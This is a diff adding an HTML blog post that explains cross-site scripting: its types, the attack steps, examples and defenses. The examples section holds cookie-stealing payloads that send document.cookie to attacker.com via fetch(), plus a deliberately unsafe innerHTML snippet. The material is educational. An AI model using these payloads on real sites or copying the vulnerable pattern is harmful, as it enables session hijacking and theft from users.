@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Post Title - Slimmshine's Code & Sec Hacks</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    :root {
+    /* Define CSS variables */
+    --black: #1d1f20;
+    --blue: #83e4e2;
+    --dark-blue: #3b67c0;
+    --green: #a2ed56;
+    --yellow: #fddc32;
+    --white: #fafafa;
+    }
+    .boxshadow {
+      box-shadow: 0.25rem 0.25rem 0.6rem rgba(0,0,0,0.05), 0 0.5rem 1.125rem rgba(75,0,0,0.05);
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      margin: 0;
+    }
+    footer {
+      background-color: var(--dark-blue) !important;
+    }
+    nav {
+      background-color: var(--dark-blue) !important;
+    }
+    .brand-logo {
+      padding-left: 20px !important; /* Add space in front of the site title */
+    }
+    main {
+      flex: 1 0 auto;
+    }
+    .page-footer {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      padding-top: 0px !important;
+    }
+    .banner {
+      width: 100%;
+      height: auto;
+    }
+    blockquote {
+      border-left: 5px solid var(--dark-blue) !important;
+      font-size: large !important;
+    }
+    ul {
+      list-style-type: disc !important;
+      padding-left: 40px !important;
+      font-size: large !important;
+    }
+    ul li {
+      display: list-item !important;
+      list-style-type: disc !important;
+      padding-left: 10px;
+      margin-bottom: 10px;
+    }
+    ul li::marker {
+      content: url("data:image/svg+xml,%3Csvg width='16' height='10' viewBox='0 0 16 10' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M12.753 5.99999L10.273 8.29399C9.877 8.68399 9.877 9.31699 10.273 9.70799C10.668 10.098 11.31 10.098 11.705 9.70799L15.555 6.06099C15.843 5.77799 16 5.40299 16 4.99999C16 4.59999 15.842 4.22199 15.556 3.93999L11.706 0.292988C11.31 -0.0970117 10.668 -0.0970117 10.272 0.292988C9.877 0.682988 9.877 1.31599 10.272 1.70699L12.752 3.99999H1C0.447 3.99999 0 4.44599 0 4.99999C0 5.54999 0.448 5.99999 1 5.99999H12.753Z' fill='%233b67c0'/%3E%3C/svg%3E%0A");
+      inline-size: 2rem;
+    }
+    ol {
+      font-size: large !important;
+    }
+    p {
+      font-size: large !important;
+    }
+    .gradient-list {
+    counter-reset: gradient-counter;
+    list-style: none;
+    margin: 1.75rem 0;
+    padding-left: 1rem;
+  }
+
+  .gradient-list > li {
+    background: white;
+    border-radius: 0 0.5rem 0.5rem 0.5rem;
+    box-shadow: 0.25rem 0.25rem 0.6rem rgba(0,0,0,0.05), 0 0.5rem 1.125rem rgba(75,0,0,0.05);
+    counter-increment: gradient-counter;
+    margin-top: 1rem;
+    min-height: 3rem;
+    padding: 1rem 1rem 1rem 3rem;
+    position: relative;
+  }
+
+  .gradient-list > li::before,
+  .gradient-list > li::after {
+    background: linear-gradient(135deg, #83e4e2 0%, #a2ed56 100%);
+    border-radius: 1rem 1rem 0 1rem;
+    content: '';
+    height: 3rem;
+    left: -1rem;
+    overflow: hidden;
+    position: absolute;
+    top: -1rem;
+    width: 3rem;
+  }
+
+  .gradient-list > li::before {
+    align-items: flex-end;
+    box-shadow: 0.25rem 0.25rem 0.6rem rgba(0,0,0,0.05), 0 0.5rem 1.125rem rgba(75,0,0,0.05);
+    content: counter(gradient-counter);
+    color: #1d1f20;
+    display: flex;
+    font: 900 1.5em/1 'Montserrat';
+    justify-content: flex-end;
+    padding: 0.125em 0.25em;
+    z-index: 1;
+  }
+
+  .gradient-list > li:nth-child(10n+1)::before,
+  .gradient-list > li:nth-child(10n+2)::before,
+  .gradient-list > li:nth-child(10n+3)::before,
+  .gradient-list > li:nth-child(10n+4)::before,
+  .gradient-list > li:nth-child(10n+5)::before {
+    background: linear-gradient(135deg, rgba(62, 126, 163, 0.2) 0%, rgba(253,220,50,0.2) 100%);
+  }
+
+  .gradient-list > li:nth-child(10n+6)::before,
+  .gradient-list > li:nth-child(10n+7)::before,
+  .gradient-list > li:nth-child(10n+8)::before,
+  .gradient-list > li:nth-child(10n+9)::before,
+  .gradient-list > li:nth-child(10n+10)::before {
+    background: linear-gradient(135deg, rgba(162,237,86,0.8) 0%, rgba(253,220,50,0.8) 100%);
+  }
+
+  .gradient-list > li + li {
+    margin-top: 2rem;
+  }
+  .custom-footer {
+    padding-bottom: 0px; /* Adjust as needed */
+    margin-bottom: 0; /* Remove any margin */
+    max-height: 90px;
+  }
+  </style>
+</head>
+<body>
+  <header>
+    <nav>
+      <div class="nav-wrapper">
+        <a href="https://slimmshine.github.io/" class=" center brand-logo">Code & Sec Hacks: Cybersecurity and Python Automation</a>
+        <ul id="nav-mobile" class="left hide-on-med-and-down">
+          <li><a href="https://slimmshine.github.io/">Home</a></li>
+          <li><a href="https://slimmshine.github.io/blog.html">Blog</a></li>
+          <li><a href="#">About</a></li>
+          <li><a href="#">Contact</a></li>
+        </ul>
+      </div>
+    </nav>
+  </header>
+
+  <main>
+    <br>
+    <section class="banner">
+      <img src="/assets/images/xss-banner.png" alt="XSS Banner Image" class="responsive-img" style="display: block; margin: 0 auto;">
+    </section>
+
+    <section class="post-content container" style="padding-bottom: 200px;">
+      <h1>What's a Cross-Site Scripting (XSS) Attack and How It Works</h1>
+      <h5><b>13 December 2024</b></h5>
+      <br>
+      <p></p>
+      <h2>Introduction</h2>
+      <p>Cross-Site Scripting (XSS) is one of the most prevalent and dangerous security vulnerabilities found in web applications. 
+        It allows attackers to inject malicious scripts into otherwise benign and trusted websites, potentially compromising the
+         security of users and the application itself.</p>
+          
+         <h2>What is XSS?</h2>
+        <blockquote>
+            <p>XSS is a type of injection attack where an attacker exploits vulnerabilities in a web application's input validation
+                 or output encoding. By injecting malicious scripts, the attacker tricks the application into executing the script
+                  within the context of a user's browser. The primary goal of an XSS attack is to hijack user sessions, steal sensitive 
+                  information, or perform unauthorized actions on behalf of the user.</p>
+        </blockquote>
+        <p>There are three main types of XSS attacks:</p>
+        <ul>
+            <li>
+                <b>Stored XSS:</b> The malicious script is permanently stored on the target server, such as in a database or a comment section.
+            </li>
+            <li>
+                <b>Reflected XSS:</b> The script is reflected off a web server, often in response to a user's request, such as a search query or URL parameter.
+            </li>
+            <li>
+                <b>DOM-based XSS:</b> The attack is executed in the client-side code, where the script modifies the Document Object Model (DOM) without interacting with the server.
+            </li>
+        </ul>
+
+        <h2>How Does XSS Work?</h2>
+        <p>To understand XSS, let’s examine the typical steps involved in an attack:</p>
+        <ol class="gradient-list">
+            <li>
+                <b>Identifying a Vulnerability:</b> Attackers look for user inputs that are processed by the application without proper sanitization or encoding. Common vectors include:
+                <ul>
+                    <li>Search or Form fields</li>
+                    <li>URL parameters</li>
+                    <li>Comment sections</li>
+                </ul>
+            </li>
+            <li>
+                <b>Crafting a Malicious Script:</b> The attacker creates a script that performs a malicious action, such as:
+                <ul>
+                    <li>Stealing cookies or session tokens</li>
+                    <li>Redirecting users to phishing sites</li>
+                    <li>Logging keystrokes or sensitive inputs</li>
+                </ul>
+            </li>
+            <li>
+                <b>Injecting the Script:</b>The script is delivered via:
+                <ul>
+                    <li>Input forms (for Stored XSS)</li>
+                    <li>Malicious links or emails (for Reflected XSS)</li>
+                    <li>Manipulated client-side scripts (for DOM-based XSS)</li>
+                </ul>
+            </li>
+            <li>
+                <b>Script Execution:</b> When the vulnerable page is loaded or interacted with, the malicious script is executed in the user’s browser as if it were legitimate content from the web application.
+            </li>
+            <li>
+                <b>Exploiting the Vulnerability:</b> Once the script is executed the attacker can now perform various actions, such as:
+                <ul>
+                    <li>Exfiltrate cookies or tokens</li>
+                    <li>Perform actions as the user (e.g., posting unauthorized content)</li>
+                    <li>Alter webpage content</li>
+                </ul>
+            </li>
+        </ol>
+        <h2>Examples of XSS Attacks</h2>
+        <h3>Stored XSS Example</h3>
+        <p>Imagine a web forum where users can post comments. If the application does not sanitize inputs, an attacker could inject a malicious script like this:</p>
+        <pre>
+            <code>
+                &lt;script&gt;
+                    fetch('https://attacker.com/steal-cookies?cookie=' + document.cookie);
+                &lt;/script&gt;
+            </code>
+        </pre>
+        <p>When the script is saved in a comment, every time another user views that comment, the browser automatically executes it. 
+            This script collects the user’s cookies (which might contain sensitive session tokens) and sends them to the attacker's 
+            server (https://attacker-site.com/steal). The attacker can then use these cookies to hijack the victim's session and gain
+             unauthorized access.</p>
+        <h3>Reflected XSS Example</h3>
+        <p>Consider a search page that echoes the user's query back in the search results. If the application does not sanitize the input, 
+            an attacker could craft a URL like this:</p>
+        <pre>
+            <code>
+                https://vulnerable-site.com/search?q=&lt;script&gt;fetch('https://attacker.com/steal-cookies?cookie=' + document.cookie);&lt;/script&gt;
+            </code>
+        </pre>
+        <p>When a user clicks on the link, the script is executed in the context of the vulnerable page, sending the user's cookies to the attacker's server.</p>
+        <h3>DOM-based XSS Example</h3>
+        <p>A web page might use JavaScript to dynamically display user-provided data, such as the hash portion of a URL. Consider the following code:</p>
+        <pre>
+            <code>
+                let userInput = location.hash.substring(1);
+                document.getElementById('content').innerHTML = userInput;
+            </code>
+        </pre>
+        <p>If a user visits a URL like:</p>
+        <pre>
+            <code>
+                https://vulnerable-site.com/#&lt;script&gt;fetch('https://attacker.com/steal-cookies?cookie=' + document.cookie);&lt;/script&gt;
+            </code>
+        </pre>
+        <p>The browser extracts the value after the # and because the input is directly inserted into the DOM without sanitization, the script is 
+            executed, sending the cookies to the attacker's server. Since the script is executed on the client-side, it is not visible in the 
+            server logs, making it harder to detect.</p>
+
+
+    <h2>Preventing XSS</h2>
+       <p>Mitigating XSS requires a combination of secure coding practices and defense-in-depth strategies:</p>
+         <ol class="gradient-list">
+            <li>
+                <b>Input Validation:</b> Validate and sanitize all user inputs to ensure they conform to expected formats and do not contain malicious code.
+            </li>
+            <li>
+                <b>Output Encoding:</b> Encode user-generated content before rendering it in the browser to prevent script execution
+            </li>
+            <li>
+                <b>Content Security Policy (CSP):</b> Implement a CSP header to restrict the sources from which scripts can be loaded, reducing the impact of XSS attacks.
+            </li>
+            <li>
+                <b>Sanitization:</b> Remove or encode potentially dangerous characters, such as <, >, and &.
+            </li>
+            <li>
+                <b>Use Security Libraries:</b> Use a library or framework that provides built-in protection against XSS, such as OWASP’s Java Encoder, DOMPurify or React's JSX.
+            </li>
+            <li>
+                <b>HTTPOnly Cookies:</b> Set the HTTPOnly flag on cookies to prevent client-side scripts from accessing them.
+            </li>
+            <li>
+                <b>Regular Security Audits:</b> Conduct regular security audits and penetration testing to identify and remediate XSS vulnerabilities.
+            </li>
+        </ol>
+        
+      <!-- Add more content as needed -->
+    </section>
+  </main>
+
+  <footer class="page-footer custom-footer">
+    <div class="container">
+      <div class="row">
+        <div class="col l12 s12 center-align">
+          <p>
+              <a class="grey-text text-lighten-3" href="https://github.com/slimmshine"><i class="fab fa-github"></i> slimmshine</a>
+          </p>
+          <p>&copy; 2024</p>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
+</body>
+</html>
